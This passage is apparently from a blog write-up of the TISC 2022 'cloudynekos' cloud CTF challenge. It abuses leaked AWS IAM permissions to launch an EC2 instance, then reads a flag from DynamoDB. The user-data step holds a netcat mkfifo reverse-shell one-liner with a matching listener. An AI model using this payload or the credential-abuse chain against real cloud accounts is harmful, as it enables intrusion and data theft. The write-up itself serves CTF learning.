</span></span><span class=line><span class=cl>                    <span class=s2>&#34;AssumeRolePolicyDocument&#34;</span>: <span class=o>{</span>
</span></span><span class=line><span class=cl>                        <span class=s2>&#34;Version&#34;</span>: <span class=s2>&#34;2012-10-17&#34;</span>,
</span></span><span class=line><span class=cl>                        <span class=s2>&#34;Statement&#34;</span>: <span class=o>[</span>
</span></span><span class=line><span class=cl>                            <span class=o>{</span>
</span></span><span class=line><span class=cl>                                <span class=s2>&#34;Effect&#34;</span>: <span class=s2>&#34;Allow&#34;</span>,
</span></span><span class=line><span class=cl>                                <span class=s2>&#34;Principal&#34;</span>: <span class=o>{</span>
</span></span><span class=line><span class=cl>                                    <span class=s2>&#34;Service&#34;</span>: <span class=s2>&#34;ec2.amazonaws.com&#34;</span>
</span></span><span class=line><span class=cl>                                <span class=o>}</span>,
</span></span><span class=line><span class=cl>                                <span class=s2>&#34;Action&#34;</span>: <span class=s2>&#34;sts:AssumeRole&#34;</span>
</span></span><span class=line><span class=cl>                            <span class=o>}</span>
</span></span><span class=line><span class=cl>                        <span class=o>]</span>
</span></span><span class=line><span class=cl>                    <span class=o>}</span>
</span></span><span class=line><span class=cl>                <span class=o>}</span>
</span></span><span class=line><span class=cl>            <span class=o>]</span>
</span></span><span class=line><span class=cl>        <span class=o>}</span>
</span></span><span class=line><span class=cl>    <span class=o>]</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span></code></pre></td></tr></table></div></div><p>Nice! But wait, there&rsquo;s more. If we recall our initial enumeration, the <code>notes.txt</code> gave us a message:
<code>All EC2 computing instances should be tagged with the key: 'agent' and the value set to your username. Otherwise, the antivirus cleaner will wipe out the resources.</code></p><p>So this means that when we create our ec2 instance, we would have to create with a tag <code>{Key=agent,Value={aws:username}}</code>.</p><p>In addition, we would also need to specify which subnet and attach any relevant security groups to the EC2 instance, along with specifying an AMI. I guess this is where the initial permissions of being able to run <code>aws ec2 describe-security-groups</code> and <code>aws ec2 describe-subnets</code> come in handy since these are the 2 key pieces of information we want for this part of the challenge:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>└─$ aws ec2 describe-subnets                                                                                  <span class=m>255</span> ⨯
</span></span><span class=line><span class=cl><span class=o>{</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;Subnets&#34;</span>: <span class=o>[</span>
</span></span><span class=line><span class=cl>        <span class=o>{</span>
</span></span><span class=line><span class=cl>            <span class=s2>&#34;AvailabilityZone&#34;</span>: <span class=s2>&#34;ap-southeast-1a&#34;</span>,
</span></span><span class=line><span class=cl>            <span class=s2>&#34;AvailabilityZoneId&#34;</span>: <span class=s2>&#34;apse1-az2&#34;</span>,
</span></span><span class=line><span class=cl>            <span class=s2>&#34;AvailableIpAddressCount&#34;</span>: 16379,
</span></span><span class=line><span class=cl>            <span class=s2>&#34;CidrBlock&#34;</span>: <span class=s2>&#34;10.0.0.0/18&#34;</span>,
</span></span><span class=line><span class=cl>            <span class=s2>&#34;DefaultForAz&#34;</span>: false,
</span></span><span class=line><span class=cl>            <span class=s2>&#34;MapPublicIpOnLaunch&#34;</span>: true,
</span></span><span class=line><span class=cl>            <span class=s2>&#34;MapCustomerOwnedIpOnLaunch&#34;</span>: false,
</span></span><span class=line><span class=cl>            <span class=s2>&#34;State&#34;</span>: <span class=s2>&#34;available&#34;</span>,
</span></span><span class=line><span class=cl>            <span class=s2>&#34;SubnetId&#34;</span>: <span class=s2>&#34;subnet-0aa6ecdf900166741&#34;</span>,
</span></span><span class=line><span class=cl>            <span class=s2>&#34;VpcId&#34;</span>: <span class=s2>&#34;vpc-095cd9241e386169d&#34;</span>,
</span></span><span class=line><span class=cl>            <span class=s2>&#34;OwnerId&#34;</span>: <span class=s2>&#34;051751498533&#34;</span>,
</span></span><span class=line><span class=cl>            <span class=s2>&#34;AssignIpv6AddressOnCreation&#34;</span>: false,
</span></span><span class=line><span class=cl>            <span class=s2>&#34;Ipv6CidrBlockAssociationSet&#34;</span>: <span class=o>[]</span>,
</span></span><span class=line><span class=cl>            <span class=s2>&#34;Tags&#34;</span>: <span class=o>[</span>
</span></span><span class=line><span class=cl>                <span class=o>{</span>
</span></span><span class=line><span class=cl>                    <span class=s2>&#34;Key&#34;</span>: <span class=s2>&#34;Name&#34;</span>,
</span></span><span class=line><span class=cl>                    <span class=s2>&#34;Value&#34;</span>: <span class=s2>&#34;palindrome&#34;</span>
</span></span><span class=line><span class=cl>                <span class=o>}</span>
</span></span><span class=line><span class=cl>            <span class=o>]</span>,
</span></span><span class=line><span class=cl>            <span class=s2>&#34;SubnetArn&#34;</span>: <span class=s2>&#34;arn:aws:ec2:ap-southeast-1:051751498533:subnet/subnet-0aa6ecdf900166741&#34;</span>,
</span></span><span class=line><span class=cl>            <span class=s2>&#34;EnableDns64&#34;</span>: false,
</span></span><span class=line><span class=cl>            <span class=s2>&#34;Ipv6Native&#34;</span>: false,
</span></span><span class=line><span class=cl>            <span class=s2>&#34;PrivateDnsNameOptionsOnLaunch&#34;</span>: <span class=o>{</span>
</span></span><span class=line><span class=cl>                <span class=s2>&#34;HostnameType&#34;</span>: <span class=s2>&#34;ip-name&#34;</span>,
</span></span><span class=line><span class=cl>                <span class=s2>&#34;EnableResourceNameDnsARecord&#34;</span>: false,
</span></span><span class=line><span class=cl>                <span class=s2>&#34;EnableResourceNameDnsAAAARecord&#34;</span>: <span class=nb>false</span>
</span></span><span class=line><span class=cl>            <span class=o>}</span>
</span></span><span class=line><span class=cl>        <span class=o>}</span>
</span></span><span class=line><span class=cl>    <span class=o>]</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>└─$ aws ec2 describe-security-groups
</span></span><span class=line><span class=cl><span class=o>{</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;SecurityGroups&#34;</span>: <span class=o>[</span>
</span></span><span class=line><span class=cl>        <span class=o>{</span>
</span></span><span class=line><span class=cl>            <span class=s2>&#34;Description&#34;</span>: <span class=s2>&#34;Access to c2 infra&#34;</span>,
</span></span><span class=line><span class=cl>            <span class=s2>&#34;GroupName&#34;</span>: <span class=s2>&#34;default-agents-sg&#34;</span>,
</span></span><span class=line><span class=cl>            <span class=s2>&#34;IpPermissions&#34;</span>: <span class=o>[</span>
</span></span><span class=line><span class=cl>                <span class=o>{</span>
</span></span><span class=line><span class=cl>                    <span class=s2>&#34;FromPort&#34;</span>: 0,
</span></span><span class=line><span class=cl>                    <span class=s2>&#34;IpProtocol&#34;</span>: <span class=s2>&#34;tcp&#34;</span>,
</span></span><span class=line><span class=cl>                    <span class=s2>&#34;IpRanges&#34;</span>: <span class=o>[</span>
</span></span><span class=line><span class=cl>                        <span class=o>{</span>
</span></span><span class=line><span class=cl>                            <span class=s2>&#34;CidrIp&#34;</span>: <span class=s2>&#34;0.0.0.0/0&#34;</span>
</span></span><span class=line><span class=cl>                        <span class=o>}</span>
</span></span><span class=line><span class=cl>                    <span class=o>]</span>,
</span></span><span class=line><span class=cl>                    <span class=s2>&#34;Ipv6Ranges&#34;</span>: <span class=o>[]</span>,
</span></span><span class=line><span class=cl>                    <span class=s2>&#34;PrefixListIds&#34;</span>: <span class=o>[]</span>,
</span></span><span class=line><span class=cl>                    <span class=s2>&#34;ToPort&#34;</span>: 65535,
</span></span><span class=line><span class=cl>                    <span class=s2>&#34;UserIdGroupPairs&#34;</span>: <span class=o>[]</span>
</span></span><span class=line><span class=cl>                <span class=o>}</span>
</span></span><span class=line><span class=cl>            <span class=o>]</span>,
</span></span><span class=line><span class=cl>            <span class=s2>&#34;OwnerId&#34;</span>: <span class=s2>&#34;051751498533&#34;</span>,
</span></span><span class=line><span class=cl>            <span class=s2>&#34;GroupId&#34;</span>: <span class=s2>&#34;sg-047c958320ee832f0&#34;</span>,
</span></span><span class=line><span class=cl>            <span class=s2>&#34;IpPermissionsEgress&#34;</span>: <span class=o>[</span>
</span></span><span class=line><span class=cl>                <span class=o>{</span>
</span></span><span class=line><span class=cl>                    <span class=s2>&#34;IpProtocol&#34;</span>: <span class=s2>&#34;-1&#34;</span>,
</span></span><span class=line><span class=cl>                    <span class=s2>&#34;IpRanges&#34;</span>: <span class=o>[</span>
</span></span><span class=line><span class=cl>                        <span class=o>{</span>
</span></span><span class=line><span class=cl>                            <span class=s2>&#34;CidrIp&#34;</span>: <span class=s2>&#34;0.0.0.0/0&#34;</span>
</span></span><span class=line><span class=cl>                        <span class=o>}</span>
</span></span><span class=line><span class=cl>                    <span class=o>]</span>,
</span></span><span class=line><span class=cl>                    <span class=s2>&#34;Ipv6Ranges&#34;</span>: <span class=o>[]</span>,
</span></span><span class=line><span class=cl>                    <span class=s2>&#34;PrefixListIds&#34;</span>: <span class=o>[]</span>,
</span></span><span class=line><span class=cl>                    <span class=s2>&#34;UserIdGroupPairs&#34;</span>: <span class=o>[]</span>
</span></span><span class=line><span class=cl>                <span class=o>}</span>
</span></span><span class=line><span class=cl>            <span class=o>]</span>,
</span></span><span class=line><span class=cl>            <span class=s2>&#34;VpcId&#34;</span>: <span class=s2>&#34;vpc-095cd9241e386169d&#34;</span>
</span></span><span class=line><span class=cl>        <span class=o>}</span>,
</span></span><span class=line><span class=cl>        &lt;Omitted&gt;
</span></span></code></pre></td></tr></table></div></div><p>So to summarise, we want to attach the following pieces of information to our ec2 instance:</p><ul><li><code>subnet-id</code>: <code>subnet-0aa6ecdf900166741</code> (retrieved through <code>aws ec2 describe-subnets</code>)</li><li><code>security-group-ids</code>: <code>sg-047c958320ee832f0</code> (retrieved through <code>aws ec2 describe-security-groups</code>)</li><li><code>tag-specifications</code>: <code>'ResourceType=instance,Tags=[{Key=agent,Value=&lt;current_username>}]'</code> (as specified in <code>notes.txt</code>)</li><li><code>iam-instance-profile</code>: <code>"Arn=arn:aws:iam::051751498533:instance-profile/ec2_agent_instance_profile</code> (retrieved through <code>aws iam list-instance-profiles</code>)</li><li><code>instance-type</code>: <code>t2.micro</code> (this can probably be anything honestly)</li><li><code>image-id</code>: <code>ami-02ee763250491e04a</code> (this can probably be anything as well but personally i chose to use an Ubuntu AMI).</li></ul><p>If you&rsquo;re familiar with EC2 instances, you would realise that in order to access the EC2 instance, you&rsquo;re going to need an SSH key, which unfortunately you do not have permissions to create. Fortunately, there&rsquo;s another way to access the instance, and that is to catch a reverse shell, injecting the necessary reverse shell payload command on startup of the instance with the <code>user-data</code> argument. So in addition to all of the above, we would also want to create a text file that contains the command we want to run on startup and pass in to the <code>user-data</code>. Since I&rsquo;m using an Ubuntu AMI, I decided to opt for the Netcat OpenBsd reverse shell command:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>└─$ cat file.txt
</span></span><span class=line><span class=cl><span class=c1>#!/bin/bash</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>rm -f /tmp/f<span class=p>;</span>mkfifo /tmp/f<span class=p>;</span>cat /tmp/f<span class=p>|</span>/bin/sh -i 2&gt;<span class=p>&amp;</span>1<span class=p>|</span>nc &lt;IPAddress_of_Server&gt; <span class=m>443</span> &gt;/tmp/f
</span></span></code></pre></td></tr></table></div></div><p>Let&rsquo;s prepare to catch the reverse shell on our server:
<code>sudo nc -nlvp 443</code></p><p>And now we run our ec2 instance!</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>└─$ aws --profile lambda ec2 run-instances <span class=se>\ </span>                                                                 <span class=m>130</span> ⨯
</span></span><span class=line><span class=cl>--subnet-id subnet-0aa6ecdf900166741 <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>--image-id ami-02ee763250491e04a <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>--instance-type t2.micro <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>--security-group-ids sg-047c958320ee832f0 <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>--tag-specifications <span class=s1>&#39;ResourceType=instance,Tags=[{Key=agent,Value=user-59b23d07b5ee4cb2a64d1e481dd4f235}]&#39;</span> <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>--user-data file://file.txt <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>--iam-instance-profile <span class=s2>&#34;Arn=arn:aws:iam::051751498533:instance-profile/ec2_agent_instance_profile&#34;</span> <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>--region ap-southeast-1
</span></span></code></pre></td></tr></table></div></div><p>After waiting for the instance to start up, we have caught our reverse shell!</p><h2 id=interacting-with-the-dynamodb-service>Interacting with the DynamoDB Service<a hidden class=anchor aria-hidden=true href=#interacting-with-the-dynamodb-service>#</a></h2><p>If we recall, our EC2 instance that has the <code>ec2_agent_instance_profile</code> attached has the <code>ec2_agent_role</code> permissions:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-json data-lang=json><span class=line><span class=cl><span class=s2>&#34;Statement&#34;</span><span class=err>:</span> <span class=p>[</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nt>&#34;Action&#34;</span><span class=p>:</span> <span class=p>[</span>
</span></span><span class=line><span class=cl>            <span class=s2>&#34;dynamodb:DescribeTable&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=s2>&#34;dynamodb:ListTables&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=s2>&#34;dynamodb:Scan&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=s2>&#34;dynamodb:Query&#34;</span>
</span></span><span class=line><span class=cl>        <span class=p>],</span>
</span></span><span class=line><span class=cl>        <span class=nt>&#34;Effect&#34;</span><span class=p>:</span> <span class=s2>&#34;Allow&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=nt>&#34;Resource&#34;</span><span class=p>:</span> <span class=s2>&#34;*&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=nt>&#34;Sid&#34;</span><span class=p>:</span> <span class=s2>&#34;VisualEditor0&#34;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>Let&rsquo;s first install the <code>aws-cli</code> onto the newly created EC2 instance:</p><p><code>sudo apt update && sudo apt install awscli</code></p><p>After installing the <code>aws-cli</code>, we can finally use it to interact with the DynamoDB service. Let&rsquo;s enumerate the list of tables first with <code>aws dynamodb list-tables</code>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ aws dynamodb list-tables --region ap-southeast-1
</span></span><span class=line><span class=cl><span class=o>{</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;TableNames&#34;</span>: <span class=o>[</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;flag_db&#34;</span>
</span></span><span class=line><span class=cl>    <span class=o>]</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span></code></pre></td></tr></table></div></div><p>Oh nice, there&rsquo;s a <code>flag_db</code> table! Let&rsquo;s scan it and see what comes up!</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ aws --region ap-southeast-1 dynamodb scan --table-name flag_db
</span></span><span class=line><span class=cl><span class=o>{</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;Items&#34;</span>: <span class=o>[</span>
</span></span><span class=line><span class=cl>        <span class=o>{</span>
</span></span><span class=line><span class=cl>            <span class=s2>&#34;secret&#34;</span>: <span class=o>{</span>
</span></span><span class=line><span class=cl>                <span class=s2>&#34;S&#34;</span>: <span class=s2>&#34;TISC{iT3_N0t_s0_C1oUdy}&#34;</span>
</span></span><span class=line><span class=cl>            <span class=o>}</span>,
</span></span><span class=line><span class=cl>            <span class=s2>&#34;name&#34;</span>: <span class=o>{</span>
</span></span><span class=line><span class=cl>                <span class=s2>&#34;S&#34;</span>: <span class=s2>&#34;flag&#34;</span>
</span></span><span class=line><span class=cl>            <span class=o>}</span>
</span></span><span class=line><span class=cl>        <span class=o>}</span>
</span></span><span class=line><span class=cl>    <span class=o>]</span>,
</span></span><span class=line><span class=cl>    <span class=s2>&#34;Count&#34;</span>: 1,
</span></span><span class=line><span class=cl>    <span class=s2>&#34;ScannedCount&#34;</span>: 1,
</span></span><span class=line><span class=cl>    <span class=s2>&#34;ConsumedCapacity&#34;</span>: null
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span></code></pre></td></tr></table></div></div><p>And there we have it! Our flag is in the <code>flag_db</code> table!</p><p>Let&rsquo;s summarise our whole journey on how we uncovered the flag:</p><p><img loading=lazy src=/images/posts/tisc-2022-level4-diagram-3.jpg alt=diagram-3></p><h2 id=final-words>Final Words<a hidden class=anchor aria-hidden=true href=#final-words>#</a></h2><p>If you made it this far, thank you for reading my write-up for this cloud challenge <code>cloudynekos</code> as part of TISC 2022! It was definitely a fun journey solving this cloud challenge and I definitely learned much more about how scary a set of leaked AWS IAM Credentials can quickly become, and also more importantly, how to abuse them as a pentester :)</p></div><footer class=post-footer><ul class=post-tags><li><a href=https://quentinkhoo.github.io/tags/ctf/>ctf</a></li><li><a href=https://quentinkhoo.github.io/tags/tisc-2022/>tisc-2022</a></li><li><a href=https://quentinkhoo.github.io/tags/cloud/>cloud</a></li><li><a href=https://quentinkhoo.github.io/tags/s3/>s3</a></li><li><a href=https://quentinkhoo.github.io/tags/lambda/>lambda</a></li><li><a href=https://quentinkhoo.github.io/tags/aws/>aws</a></li><li><a href=https://quentinkhoo.github.io/tags/dynamodb/>dynamodb</a></li><li><a href=https://quentinkhoo.github.io/tags/ec2/>ec2</a></li><li><a href=https://quentinkhoo.github.io/tags/rce/>rce</a></li></ul><nav class=paginav><a class=prev href=https://quentinkhoo.github.io/posts/tisc-2022-web-palindrome-secret/><span class=title>« Prev</span><br><span>TISC 2022 Web Palindrome's Secret</span></a>
<a class=next href=https://quentinkhoo.github.io/posts/seetf-2022-smart-contract-dupersupersafe/><span class=title>Next »</span><br><span>SEETF 2022 Smart Contract DuperSuperSafe</span></a></nav><div class=share-buttons><a target=_blank rel="noopener noreferrer" aria-label="share TISC 2022 Cloud Cloudynekos on twitter" href="https://twitter.com/intent/tweet/?text=TISC%202022%20Cloud%20Cloudynekos&url=https%3a%2f%2fquentinkhoo.github.io%2fposts%2ftisc-2022-cloud-cloudynekos%2f&hashtags=ctf%2ctisc-2022%2ccloud%2cs3%2clambda%2caws%2cdynamodb%2cec2%2crce"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share TISC 2022 Cloud Cloudynekos on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2fquentinkhoo.github.io%2fposts%2ftisc-2022-cloud-cloudynekos%2f&title=TISC%202022%20Cloud%20Cloudynekos&summary=TISC%202022%20Cloud%20Cloudynekos&source=https%3a%2f%2fquentinkhoo.github.io%2fposts%2ftisc-2022-cloud-cloudynekos%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share TISC 2022 Cloud Cloudynekos on reddit" href="https://reddit.com/submit?url=https%3a%2f%2fquentinkhoo.github.io%2fposts%2ftisc-2022-cloud-cloudynekos%2f&title=TISC%202022%20Cloud%20Cloudynekos"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share TISC 2022 Cloud Cloudynekos on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fquentinkhoo.github.io%2fposts%2ftisc-2022-cloud-cloudynekos%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share TISC 2022 Cloud Cloudynekos on whatsapp" href="https://api.whatsapp.com/send?text=TISC%202022%20Cloud%20Cloudynekos%20-%20https%3a%2f%2fquentinkhoo.github.io%2fposts%2ftisc-2022-cloud-cloudynekos%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 